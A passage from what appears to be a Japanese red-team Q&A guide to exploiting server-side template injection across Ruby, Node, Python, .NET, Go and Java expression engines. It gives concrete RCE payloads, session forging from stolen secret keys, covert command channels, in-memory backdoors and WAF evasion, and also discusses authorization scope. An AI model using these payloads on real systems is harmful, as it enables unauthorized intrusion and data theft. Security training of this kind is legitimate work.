**A5**: 安定チャネルに転じる。外向き通信のより緩いプロトコル(DNS/HTTPS/ICMP トンネル)に替えるか、SSTI 自身を「コマンド実行 API」として使い、HTTP ハートビート式 C2(各リクエストでコマンド一条を実行、Web トラフィックに溶け込み、接続層に遮られにくい)。チャネルが不安定ならプロトコル次元を替え、切られるチャネルで反復再接続しない。

### Ruby ERB / Slim 系テンプレートの利用
**Q1**: フィンガープリントが Ruby スタックを指し、`<%= 7*7 %>` が 49 を出す。ERB の RCE をどう進む?
**A1**: ERB は直接 Ruby コードを埋め込む。`<%= system('id') %>`、`<%= \`id\` %>`(バッククォート)、`<%= IO.popen('id').read %>`。Ruby テンプレートは本質的に埋め込みコードで、RCE の敷居が反射チェーンより低い。まず `system`/バッククォートを試す。
**Q2**: Slim/Haml の場合は?構文が違う。
**A2**: Slim/Haml も Ruby の埋め込みを許す。注入点はそれらのコード求値構文(`#{...}` 補間か `-`/`=` の行接頭辞)。具体的なエンジンに定めたら、そのコード求値構文で `system`/backtick を実行する。
**Q3**: Ruby アプリが Rails だ。SSTI はどこに隠れる?
**A3**: Rails では `render inline:` がユーザー制御可能、あるいはローカライズ/翻訳ファイルの注入、あるいはユーザー入力をテンプレートとして描画する反パターン。Rails 特性と組み合わせる。RCE を得たら `secret_key_base` を読んで cookie を偽造する、あるいは `database.yml` を読む。
**Q4**: Ruby テンプレート RCE が制限されたか注入ができない。塞がれたらどこへ転じる?
**A4**: Ruby/Rails の他の穴に転じる。デシリアライズ(Marshal/YAML.load)、`secret_key_base` 漏えいによる cookie デシリアライズ RCE。SSTI の任意読取能力で先に secret を読んでから cookie チェーンを進み、直交する入口から打ち込む。

### Node テンプレートエンジン(EJS/Pug/Handlebars)の利用
**Q1**: フィンガープリントが Node スタックの EJS で、`<%= %>` が求値する。RCE をどう進む?
**A1**: EJS はサーバー側描画で、注入点は往々にして EJS のあるオプション(歴史的な `settings[view options]`/`outputFunctionName` のパラメータ汚染 RCE など)か直接のコード埋め込みにある。EJS 版を定めたら対応チェーンを当てる。核心はそれを実行可能な JS に連結させることだ。
**Q2**: Pug(Jade)の場合は?
**A2**: Pug は JS 式とコードブロックの埋め込みを許す。Pug ソースに注入すれば `#{global.process.mainModule.require('child_process').execSync('id')}` 系 payload を実行できる。Node の `process`/`require` で `child_process` を取る。
**Q3**: Handlebars/Nunjucks の場合は?それらはより「ロジック非依存」だ。
**A3**: Handlebars はプロトタイプチェーン/helper 構築で `constructor` へエスケープする必要がある。Nunjucks は `{{range.constructor("return global.process...")()}}` 系のプロトタイプチェーンを進む。共通の核心: JS で任意オブジェクトの `constructor.constructor` から `Function` コンストラクタを取って任意コードを実行する。
**Q4**: Node テンプレート RCE 後に目標が外向き通信しない。どうする?
**A4**: 外向き通信しない利用に転じる。`child_process` で出力を Web 静的ディレクトリに書いて HTTP で取り戻す。あるいは Node プロセス内に `require` キャッシュ/ミドルウェアベースのメモリ馬式バックドアを注入する。あるいは DNS 側チャネルで帯外する。Node 場面も同様に「無外向き通信でもデータを収める」チャネルを優先する。

### 「求値は成功するが RCE が取れない」根本原因の判断
**Q1**: `{{7*7}}` は求値するが、全 RCE payload が失敗する。まずどの原因かをどう特定する?
**A1**: 三種の根本原因に分けて調べる。一つはサンドボックス(エンジンがセーフモードを開き、危険属性が禁じられた)。二つはブラックリスト(WAF/アプリがキーワードをフィルタ)。三つは環境制限(RCE 文は実行されたが seccomp/disable_functions/権限に塞がれた)。三種の転向はまったく異なる。先に分診する。
**Q2**: サンドボックスかブラックリストかをどう区別する?
**A2**: 無害な機密属性のアクセスを試す(`__class__` だけアクセスして呼ばない)。正常結果が返れば属性はアクセス可能(実行の環が塞がれた)。「アクセス禁止」系の異常ならサンドボックス。403/遮断が返れば WAF ブラックリスト。異常情報の種別が分診の鍵だ。
**Q3**: サンドボックスと確認した。転向は?
**A3**: サンドボックスエスケープの専題に転じる(周辺オブジェクト/間接参照/新機能の迂回を探す)、あるいはファイル読取/SSRF/情報漏えいの価値搾取に降格する。
**Q4**: 環境制限と確認した(コマンドは走ったが seccomp/disable_functions に塞がれた)。転向は?
**A4**: 対応する迂回の専題に転じる。Linux は seccomp 迂回/syscall 交代/メモリ馬、PHP は disable_functions 迂回。RCE 原語が存在してただ制限されただけなので、サンドボックスより扱いやすい。具体的な制限機構に狙って迂回を探す。
**Q5**: 三種とも調べても突破できない。全体が塞がれた。最後にどこへ転じる?
**A5**: 「難点を認める+情報再利用」に転じる。確認済みの求値能力を情報漏えい(版/パス/鍵/内部構造)に使い、これらを他の穴に与える。同時に攻撃面を転換してアプリの別の入口を探す。単一の穴が打ち抜けないのは常態で、複数の穴の情報連結で突破する。

### Python の他のエンジン(Mako/Cheetah/Genshi)の分診
**Q1**: バックエンドが Python だが `{{7*7}}` は求値せず、`${7*7}` が 49 を出す。どんなエンジンの可能性がある?
**A1**: Python は Jinja2 だけではない。`${}` 構文は Python では Mako を指す。Mako は `${...}` 式と `<% %>` コードブロックを使う。`${7*7}` が求値すれば高い確率で Mako。さらに `<% %>` で Python コードを埋められるかを確認する。
**Q2**: Mako と確認した。RCE は Jinja2 より簡単か複雑か?
**A2**: はるかに簡単だ。Mako は既定で無サンドボックス且つ直接 Python を埋め込める。`<%import os%>${os.popen('id').read()}` か `${self.module.cache.util.os.system('id')}`。Mako のビルトイン名前空間(`self`/`local`/`cache`)はしばしばモジュールに直達でき、subclasses の長いチェーンを登る必要がない。
**Q3**: Cheetah/Genshi の場合は?
**A3**: Cheetah は `$var`/`#` ディレクティブを使い、`#import`+`$os.system(...)` ができる。Genshi は XML テンプレートの `${}` を進む。具体的なエンジンに定めたら、そのコード求値構文を使う。Python 系は Jinja2 以外の多くが既定で無サンドボックスで、RCE の敷居が低い。重点は先にエンジンを正しく分診することだ。
**Q4**: 分診プローブが全て求値せず、具体的な Python エンジンを判定できない。塞がれたらどこへ転じる?
**A4**: エラー駆動に転じる。構文破壊 payload を送って異常スタックを見る。Mako/Cheetah の異常クラス名とファイルパスは特徴が鮮明だ。それも駄目ならフレームワークの先験(どの Web フレームワークを使えばどのテンプレートが付くか)で候補を絞り、そのコード埋め込み構文を逐一試す。

### .NET Razor / ASP.NET テンプレート注入
**Q1**: 対象が .NET スタックだ。テンプレート注入を疑う。プローブをどう打つ?
**A1**: ASP.NET の古典 `<%= 7*7 %>`(WebForms)か Razor の `@(7*7)`。この二組を試して 49 が出るかを見る。Razor は .NET の現代の主力で、注入点はユーザーに Razor テンプレートを提供させる機能(RazorEngine の動的コンパイル場面など)にありがちだ。
**Q2**: Razor が求値した。RCE をどう構築する?
**A2**: Razor は直接 C# を埋め込む。`@{ System.Diagnostics.Process.Start("cmd","/c whoami"); }` か `System.IO` を呼んでファイルを読み書きする。RazorEngine の動的コンパイルでユーザーテンプレート=任意 C# の直接コンパイル実行。RCE が直達する。
**Q3**: ASP Classic / 旧 WebForms の `<%%>` の場合は?
**A3**: この種はサーバー側コードブロックを注入できれば同様に VBScript/C# を実行できる。ただし `<%%>` は設計態テンプレートで実行時のユーザー入力を受けないことが多く、注入面が小さい。ユーザー入力を本当にテンプレートとしてコンパイルするかを確認し、単なる表示でないかを見る。
**Q4**: .NET テンプレート注入が突破できない。塞がれたらどこへ転じる?
**A4**: .NET の直交面に転じる。ViewState デシリアライズ(machineKey を取れば偽造可能)、JSON.NET/BinaryFormatter デシリアライズ、`__VIEWSTATE` 改ざん。SSTI の任意読取で `web.config` を読んで machineKey を取れれば、直接 ViewState チェーンに転じて RCE を打つ。入口を替える。

### Go text/template の限定的な注入
**Q1**: バックエンドが Go で、`{{7}}` 系の構文に反応がある。Go テンプレートは RCE できるか?
**A1**: 鍵はまず `text/template` か `html/template` かを分ける。Go テンプレートは「データ駆動」で、Jinja2 のように任意求値できない。渡されたデータと登録済み関数にしかアクセスできない。`{{7*7}}` は算術すらサポートしない。Python のようにチェーンを登ることを期待しない。
**Q2**: では Go テンプレート注入の価値はどこにある?
**A2**: 主に情報漏えいだ。`{{.}}` がコンテキストのデータ構造全体を印刷し、テンプレートに渡された機密オブジェクト(ユーザー情報、設定、内部フィールド)を漏らし得る。`{{.Password}}` 類で本来描画すべきでないフィールドを読める。価値はデータの権限外読取で、RCE ではない。
**Q3**: コンテキストにたまたま危険な関数が登録された場合は?
**A3**: ならば RCE 入口だ。アプリがテンプレートにコマンド実行/システム呼び出しができるカスタム関数を登録していれば(`FuncMap` 内)、`{{callDangerousFunc}}` が誘発できる。アプリがどんなテンプレート関数を登録したかを監査することが Go SSTI の鍵だ。
**Q4**: Go テンプレートはデータを読むだけで RCE できないと確認した。塞がれたらどこへ転じる?
**A4**: 「データ漏えいの最大化+穴替え」に転じる。`{{.}}`/フィールド走査でコンテキストの機密データを搾り尽くす(token/内部構造を含み得る)、他の攻撃に与える。RCE は Go アプリの他の面(SSRF、パストラバーサル、デシリアライズ)を進む。Go テンプレートで RCE を強要しない。

### OGNL / SpEL 式インジェクションとテンプレート注入の判別
**Q1**: 注入点が求値するがテンプレート構文でなく、純粋な式(Struts の OGNL など)に見える。どう判別する?
**A1**: 「テンプレートエンジン」と「式エンジン」を分ける。OGNL(Struts2/OGNL)、SpEL(Spring)は式言語で、注入形態はパラメータ値が式として求値される(`%{7*7}`、`#{7*7}` など)。必ずしもテンプレートタグがあるとは限らない。判定基準: 注入点が Struts のパラメータ名/OGNL コンテキストか、Spring の `@Value`/SpEL 求値箇所か。
**Q2**: OGNL と確認した。RCE の骨格は?
**A2**: OGNL の古典は `#context`/`@java.lang.Runtime@getRuntime().exec()` を進み、先に Struts のセキュリティコンテキスト(`_memberAccess`)を迂回する必要がある。歴史上、複数の Struts2 S2-xxx が OGNL サンドボックス迂回だ。核心は `allowStaticMethodAccess` を設定するか `(new ...)` を使うこと。
**Q3**: SpEL の場合は?
**A3**: SpEL は `T(java.lang.Runtime).getRuntime().exec(...)` か `new ProcessBuilder(...)` を進み、Thymeleaf 内の SpEL と同源だ。注入点は Spring の式求値場面(`@Value`、Spring Security 式、SpEL API の誤用)にありがちだ。
**Q4**: OGNL/SpEL のサンドボックスが迂回できない。塞がれたらどこへ転じる?
**A4**: 版に対応する既知の迂回チェーンに転じる(Struts2/Spring のサンドボックス迂回には明確な CVE 系譜があり、版で選ぶ)、あるいは式で情報漏えい/SSRF に降格する。それも駄目ならアプリの他の穴に替える。それを「テンプレート注入」でなく「式インジェクション」として資料を調べる方向が正しい。

### Jinja2 鍵漏えいからセッション偽造への完全なチェーン
**Q1**: Jinja2 が config を読めるが RCE がサンドボックスに塞がれ、Flask の `SECRET_KEY` を読めた。次にどう権限昇格に変える?
**A1**: SECRET_KEY は Flask session の署名鍵だ。それを取れば任意の session cookie を偽造できる。自分の session を `admin`/権限昇格フィールドに変え、署名して再送し、直接管理者身元でアクセスする。これは「鍵を読む→身元を偽造する」の古典的な格上げで、RCE 不要だ。
**Q2**: 偽造成功を確認し、偽造すべきフィールドを見つけるには?
**A2**: まず自分の既存 cookie を解いて構造を見る(鍵で解ける)。中にどんなフィールド(user_id/role/is_admin)があるかを観察する。鍵フィールドを変えて再署名する。判定基準: 再送後に本来 403 の管理機能にアクセスできれば成功だ。
**Q3**: 読んだのが別のフレームワークの鍵(Django/Rails)の場合は?
**A3**: 同様だが機構が異なる。Django の SECRET_KEY は署名/パスワードリセット token の偽造に使える。Rails の `secret_key_base` はもっと強烈で、それが署名する cookie がデシリアライズを誘発し得る。取れればしばしば RCE に等しい。フレームワークごとに鍵の「最大殺傷用途」を確定する。
**Q4**: 鍵は読めたが session 偽造が権限昇格に効かない(権限が cookie にない)。塞がれたらどこへ転じる?
**A4**: 鍵の他の用途に転じる。署名付きのパスワードリセット/メール検証 token の偽造、CSRF token の予測、暗号データの復号。全て無効なら、SSTI に戻って RCE を探すか穴を替える。鍵は資産で、角度を替えて価値を搾る。session 偽造に一本吊りしない。

### 入力長が制限されたときの短 payload 戦略
**Q1**: 注入点に長さ制限がある(数十文字のみなど)。完全な RCE チェーンが入らない。どうする?
**A1**: まず「payload を分割できるか」を考える。SSTI は複数リクエストで段階実行できることが多い。第一歩は短 payload で変数を設定する/半分を書く、第二歩で続ける。あるいはパラメータ密輸。テンプレートボディには極短い参照だけを書き、長い payload を長さ制限のない別パラメータに置く。
**Q2**: エンジンが変数代入をサポートする。どう利用して圧縮する?
**A2**: エンジンの代入構文で長い式を複数の短い代入に分割して累加する(Jinja2 の `{% set %}`、Velocity の `#set`、Mako のコードブロック)、複数リクエストで構築し、最後に一度誘発する。長さ制限を「単回」から「複数回」に分散する。
**Q3**: 注入機会が一度だけで長さが固定だ。最短チェーンをどう選ぶ?
**A3**: エンジン最短のグローバル近道を選ぶ(Jinja2 は `lipsum`/`cycler` で os に直達し、subclasses より数倍短い。Mako は直接 `os`)。「ファイルを一つ読む」か「ダウンロード実行」という短原語を優先する。短コマンドで大きな payload を引いて足場確保してから実行し、長さ問題を第二段階に外注する。
**Q4**: どう圧縮しても上限を超える。この道が塞がれた。どこへ転じる?
**A4**: 別の注入点に転じる。同アプリの長さ制限のない他の SSTI 担体(POST body、header、保存型フィールド)。長さ制限は往々にしてあるフロントエンドフィールドにしかなく、入口を替えれば制限がないことが多い。

### 多層描画時の本当の描画層の特定
**Q1**: リクエストがフロントエンド→ゲートウェイ→複数のマイクロサービスを経て、SSTI が求値したがどの層で描画されたかわからない。どう特定する?
**A1**: 帯外の層別プローブを使う。payload に DNS/HTTP 戻りを送れる式を埋め、戻りがどの出口 IP から来るかを見る。それが本当に描画するサービスのいるネットワークセグメントだ。層ごとに出口 IP が異なり、一測でわかる。
**Q2**: どの層で描画されるかをなぜ必ず知る必要がある?
**A2**: 描画層が、どのエンジンの利用チェーンを使うか、RCE がどのマシンに落ちるか、どんな内部ネットワークに届くか、外向き通信方針はどうかを決めるからだ。層を誤って打つと payload は無効で、得た足場の価値もエッジゲートウェイか核心サービスかで決まる。
**Q3**: 戻り情報もゲートウェイの統一出口に平らにされ、層を分けられない。どうする?
**A3**: エラー/遅延の層別特徴に転じる。層ごとにエラーページ形式、レスポンス遅延ベースライン、タイムアウト挙動が異なる。あるいは payload で環境識別子(ホスト名、内部 IP、環境変数)を読んで落点を判断する。RCE 後の第一条コマンドを `hostname`/`ip a` にして自ら名乗らせる。
**Q4**: 描画が深層の内部ネットワークサービス(前に数ホップ隔たる)にあると確認した。二次利用に届かない。塞がれたらどこへ転じる?
**A4**: 「描画層を足がかりにする」発想に転じる。深層サービスで実行できるなら、それでリバーストンネル/プロキシを起して戻し、深層足場を内部ネットワーク入口に変える。届かないのは問題ではなく、能動的に出させればよい。外向き通信も封じられたら、SSTI の HTTP ハートビート式コマンドチャネル(元リクエストチェーン経由で戻す)を進む。

### プローブの冪等性:ページ破壊で再テスト不能になるのを避ける
**Q1**: payload に副作用(データ変更、エラーで機能ロック)があり、注入点が一度使うと廃れるのが怖い。プローブをどう設計する?
**A1**: 探査段階は「読取専用、冪等、無副作用」の原則を守る。`{{7*7}}` の純計算、`{{7*'7'}}` の純文字列を使い、探査期に書操作、削除、状態変更系 payload を絶対に送らない。先に求値とエンジンを確認し、それから副作用のある利用へ慎重に格上げする。
**Q2**: 注入点が「保存してから表示」の保存型で、反復注入がデータを汚染する。どうする?
**A2**: 一意で回収可能なマークを使う。各注入に独特の乱数文字列を帯び、識別と後続の清掃を容易にする。優先してテストアカウント/サンドボックスデータで操作する。各注入位置を記録して再現とクリーンアップを可能にする。本番データの汚染を避けつつ追跡可能性を保証する。
**Q3**: payload が 500 を誘発して機能全体が使えなくなり、後続テストができない。どう回復する?
**A3**: 不正データをデータベースに入れて毎回ロードが崩れるなら、正当な値で上書きして機能を回復する必要がある。だから副作用のある利用の前に「ロールバック経路」を考える。探査期はデータベースに落ちないパラメータ受け渡し(GET/一時)を、データベースに落ちるフィールドより優先する。
**Q4**: 注入点を既に壊して再テスト不能になった。塞がれたらどこへ転じる?
**A4**: 同類の他の注入点に転じる(同機能の他フィールド/他 API に同じ穴がありがち)、あるいはセッション/環境を替えてやり直す。同時に今回の教訓を固化する。以降は高価値点を先に傍路で検証してから主目標を動かす。レッドチームは自分の攻撃面を自分で壊さない。

### 認可境界と爆発半径の制御
**Q1**: SSTI がまさに RCE できる。動く前に「競技/認可」角度でまず何を考える?
**A1**: まず爆発半径を考える。RCE の第一条コマンドは絶対に破壊的であってはならない(`rm`、データ変更、サービス停止)。先に無害な偵察(`whoami`/`id`/`hostname`)をし、落点、権限、認可範囲内かを確認してから次の一歩を決める。レッドチームの専門性は自制に現れる。
**Q2**: shell を取って、これが本番システムで実際のユーザーデータがあるとわかった。どう分寸を取る?
**A2**: 「利用可能を証明したら止める」原則に従う。目標はリスクの証明(何を読めるか、どこへ届くか)であり、損害の発生ではない。実際のユーザーの機密データをダウンロードせず、持続的な破壊を避ける。最小の PoC 証拠(設定の一部をマスクして読むなど)だけを切り取る。
**Q3**: リバースシェル / バックドア植え付けは範囲外しないか?
**A3**: 認可範囲次第だ。認可にポストペネトレーションが含まれればよいが、制御可能で回収可能なチャネルを使い、クリーンアップ記録をきちんとする。認可が「RCE の証明」までなら、実行証拠を得たら止める。動作前に認可書の境界と照合する。
**Q4**: 認可範囲外のシステムへ横展開できるとわかった。「壁」(境界)に塞がれた。どうする?
**A4**: これは技術の壁でなく認可の壁だ。境界で止まり、「横展開経路が存在する」ことを発見として記録・報告し、範囲外して実際に操作しない。方向転換として、認可範囲内で深化を続け、範囲外部分は報告書に書いて顧客にリスクを知らせる。コンプライアンスはレッドチームの越えてはならない一線だ。

### SSTI でソースを読んだ後のホワイトボックス化の転換
**Q1**: SSTI がファイルを読める。アプリソースを読んだ。ブラックボックスの攻め方をどうホワイトボックスに格上げする?
**A1**: 即座に「推測」から「見る」へ転じる。ソースを読んで特定する。テンプレート描画の正確なコード(エンジン/サンドボックス設定の確認)、他の未発見の注入点と危険関数、ハードコード鍵/認証情報、内部 API と認証・認可ロジック。ホワイトボックス化で後続の各歩に根拠ができ、大幅に加速する。
**Q2**: 優先してどのファイルを読む?
**A2**: ROI 順に。入口設定(ルート/ミドルウェア/フレームワーク設定)、鍵を含む設定ファイル、認証・認可モジュール、ユーザー入力を処理するコントローラ、依存リスト(既知の脆弱なコンポーネントを探す)。目標はアプリの攻撃面地図を素早く立てることだ。
**Q3**: ソースを読んで、現在の SSTI 点のサンドボックスが確かに塞がっているとわかった。ホワイトボックスで新しい突破口をどう探す?
**A3**: ソースで他の穴を探す。デシリアライズ点、コマンド連結、SQL 連結、他のテンプレート描画点(防御が不一致)、認証・認可欠陥。ホワイトボックスでの脆弱性監査効率はブラックボックスブラインド攻撃よりはるかに高い。SSTI でソースを読む最大の価値は、アプリ全体を広げて監査できることだ。
**Q4**: ソースがコンパイル済み/暗号化で読めない。読取のホワイトボックス化が阻まれた。塞がれたらどこへ転じる?
**A4**: 実行時に読める情報に転じる。設定ファイル、ログ、環境変数、`/proc`、依存ライブラリファイル(逆コンパイル/既知 CVE の照会)。ソースを読めなくても「環境と依存」を読めば攻撃面を推測できる。あるいはブラックボックスに戻って続ける。ホワイトボックスは加速器であって唯一の道ではない。

### 単点のタイムボックスと転向リズム(メタ意思決定)
**Q1**: 一つの SSTI 点に長く費やしても突破できない。続けるか転向するかをどう判断する?
**A1**: タイムボックスを設ける。単点に明確な予算を定める(数ラウンドの試行/固定時間など)。時間に達したら強制的に評価する。進展の傾向があるか(より多くのフィルタを段階的に迂回)それとも原地で空回りか。傾向があれば続けられる。空回りなら棚上げして他面に転じ、埋没費用の罠を避ける。
**Q2**: この点が「固執に値するか」をどう判断する?
**A2**: 三要素を天秤にかける。この点を突破した収益(RCE/核心データに届くか)、現在の行き詰まりの性質(payload 技が一つ欠けるのか、0day が必要か)、代替経路の有無(他所にもっと易しい穴があるか)。高収益+技不足 → 続ける。低収益か 0day 必要+代替あり → 転じる。
**Q3**: 転じた後、この点に記録を残すべきか?
**A3**: 必須だ。「SSTI があるが何かの防御に塞がれた」ことを情報として残す(エンジン、版、どこで詰まったか、何を試したか)。後続で新情報(ソースを読めた、鍵を見つけた)を得たら戻って再攻できる。棚上げ≠放棄、それはスケジューリングだ。
**Q4**: 全経路が詰まった(全て塞がれた)。全体のリズムをどう進める?
**A4**: 「広さの再スキャン」に転じる。情報収集に戻り、攻撃面を広げる(新サブドメイン/新ポート/新機能/新パラメータ)。未測の注入点がよくある。レッドチームが詰まったときの標準動作は、行き詰まり点で硬く消耗せず、偵察の面拡大に退くこと。深さが打てなければ広さに替える。

### 自動化 SSTI ツールの使用時機と限界
**Q1**: 手動プローブが遅い。直接自動化 SSTI ツール(tplmap 類)を一括で走らせるべきか?
**A1**: 場面で分ける。認可が十分で、非高防目標、迅速な確認が欲しいとき、自動化ツールは一度に多エンジンのプローブと一般的な利用チェーンを走らせ、手動を省ける。ただしその限界を明確にすべき。payload 特徴が明らかで WAF に即遮断されやすい、防御を驚かせやすい、非典型な注入点(保存型/多層描画/カスタムフィルタ)にはほぼ無効だ。
**Q2**: ツールが「注入できる疑い」を出したが shell を取れない。どうする?
**A2**: ツールの結論だけを信じない。手動に戻ってツールが報告したエンジンと注入点を検証し、自分でエンジン特性に合わせてより適合する payload を構築する。ツールは「発見」を得意とし、「特定環境の防御の迂回」を得意としない。ラストワンマイルのサンドボックスエスケープ/WAF 迂回はほぼ全て手動だ。
**Q3**: 対象に WAF があり、自動化ツールを走らせると即 IP を封じられる。この道が塞がれた。どう転じる?
**A3**: 純粋な手動の低速探査に転じる。自分で冪等、エンコード、分診の最小プローブを設計し、頻度と特徴を制御する。高防環境では自動化ツールは負の資産だ(暴露が速く、命中が低い)。手動の隠密と柔軟がこのとき唯一の実行可能な道だ。
**Q4**: ツールも手動も SSTI があると確認したが、どちらも利用を突破できない。全体として転向する?
**A4**: 根本原因の三分診(サンドボックス/ブラックリスト/環境制限)に戻って逐項で性質を判定し、エスケープ、迂回、降格での価値搾取のどれを進むか決める。ツールが突破できないのは「標準チェーンが無効」なだけで、穴に価値がないわけではない。手動深掘りか攻撃面の転換に転じ、ツールの失敗で死刑を宣告しない。
